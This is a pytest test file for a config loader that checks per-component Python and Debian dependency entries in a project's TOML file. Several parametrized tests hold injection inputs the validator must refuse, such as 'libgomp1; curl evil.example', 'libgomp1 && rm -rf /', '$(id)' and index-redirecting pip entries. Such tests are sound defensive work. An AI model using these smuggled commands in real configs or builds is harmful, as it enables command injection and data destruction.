import pytest
import tomli_w

from vecten_shared.config import VectenConfig, load_config
from vecten_shared.output import ExitCode, Failure

PROJECT = {"users": 1, "project": {"name": "a", "scaffold_version": "0.1.0"}}


def _load(tmp_path, **sections):
    (tmp_path / "vecten.toml").write_text(tomli_w.dumps({**PROJECT, **sections}))
    return load_config(tmp_path)


def test_no_dependencies_section_means_no_project_requirements():
    config = VectenConfig.model_validate(PROJECT)
    assert config.dependencies.python("platform") == []
    assert config.dependencies.python("mcp") == []
    assert config.dependencies.python("cli") == []


def test_each_component_keeps_its_own_python_requirements(tmp_path):
    config = _load(
        tmp_path,
        dependencies={
            "platform": {"python": ["polars>=1,<2"]},
            "mcp": {"python": ["rapidfuzz>=3,<4"]},
            "cli": {"python": ["polars>=1,<2"]},
        },
    )
    assert config.dependencies.python("platform") == ["polars>=1,<2"]
    assert config.dependencies.python("mcp") == ["rapidfuzz>=3,<4"]
    assert config.dependencies.python("cli") == ["polars>=1,<2"]


def test_a_section_for_a_component_the_project_lacks_is_refused(tmp_path):
    with pytest.raises(Failure) as caught:
        _load(tmp_path, components=["platform"], dependencies={"mcp": {"python": ["rapidfuzz"]}})
    assert caught.value.code == ExitCode.CONFIG
    assert "dependencies.mcp" in caught.value.message


def test_the_cli_section_is_allowed_in_every_project(tmp_path):
    config = _load(tmp_path, components=["mcp"], dependencies={"cli": {"python": ["polars"]}})
    assert config.dependencies.python("cli") == ["polars"]


@pytest.mark.parametrize(
    "entry",
    [
        "git+https://example.com/x.git",
        "polars @ https://example.com/polars.whl",
        "./local/package",
        "-e ./local",
        "--index-url https://example.com",
        "polars; python_version < '3.15'",
        "polars\n--extra-index-url https://example.com",
    ],
)
def test_python_entries_are_name_extras_and_version_only(tmp_path, entry):
    with pytest.raises(Failure) as caught:
        _load(tmp_path, dependencies={"platform": {"python": [entry]}})
    assert caught.value.code == ExitCode.CONFIG
    assert "dependencies.platform" in caught.value.message


def test_unknown_keys_in_a_section_are_refused(tmp_path):
    with pytest.raises(Failure) as caught:
        _load(tmp_path, dependencies={"platform": {"pip": ["polars"]}})
    assert caught.value.code == ExitCode.CONFIG


def test_saving_a_project_without_dependencies_writes_no_dependencies_table(tmp_path):
    from vecten_shared.config import save_config

    save_config(tmp_path, VectenConfig.model_validate(PROJECT))
    assert "dependencies" not in (tmp_path / "vecten.toml").read_text()


def test_saving_keeps_declared_dependencies(tmp_path):
    from vecten_shared.config import save_config

    config = _load(tmp_path, dependencies={"platform": {"python": ["polars>=1,<2"]}})
    save_config(tmp_path, config)
    assert load_config(tmp_path).dependencies.python("platform") == ["polars>=1,<2"]


def test_system_packages_are_kept_per_image(tmp_path):
    config = _load(
        tmp_path,
        dependencies={
            "platform": {"system": ["libgomp1", "libpq5=15.8-0+deb12u1"]},
            "mcp": {"system": ["fonts-dejavu-core"]},
        },
    )
    assert config.dependencies.system("platform") == ["libgomp1", "libpq5=15.8-0+deb12u1"]
    assert config.dependencies.system("mcp") == ["fonts-dejavu-core"]
    assert config.dependencies.system("cli") == []


@pytest.mark.parametrize(
    "entry",
    [
        "libgomp1; curl evil.example",
        "libgomp1 && rm -rf /",
        "$(id)",
        "`id`",
        "LibGomp1",
        "-o APT::Get::AllowUnauthenticated=true",
        "libgomp1=1.0 extra",
        "libgomp1\nrm",
        "",
        "a",
        "curl-",
        "curl=1.0-",
        "libpq5=1:~",
        "libpq5=a",
        "libpq5=x:1.0",
    ],
)
def test_a_system_entry_that_is_not_a_debian_package_name_is_refused(tmp_path, entry):
    with pytest.raises(Failure) as caught:
        _load(tmp_path, dependencies={"platform": {"system": [entry]}})
    assert caught.value.code == ExitCode.CONFIG
    assert "dependencies.platform" in caught.value.message
    assert repr(entry) in caught.value.message or entry == ""


@pytest.mark.parametrize(
    "entry", ["libgomp1", "g++", "libstdc++6", "libpq5=15.8-0+deb12u1", "tzdata=1:2024a-0+deb12u1"]
)
def test_real_debian_names_and_versions_are_accepted(tmp_path, entry):
    config = _load(tmp_path, dependencies={"platform": {"system": [entry]}})
    assert config.dependencies.system("platform") == [entry]


def test_system_packages_for_the_cli_are_refused(tmp_path):
    with pytest.raises(Failure) as caught:
        _load(tmp_path, dependencies={"cli": {"system": ["libgomp1"]}})
    assert caught.value.code == ExitCode.CONFIG
    assert "laptop" in caught.value.message
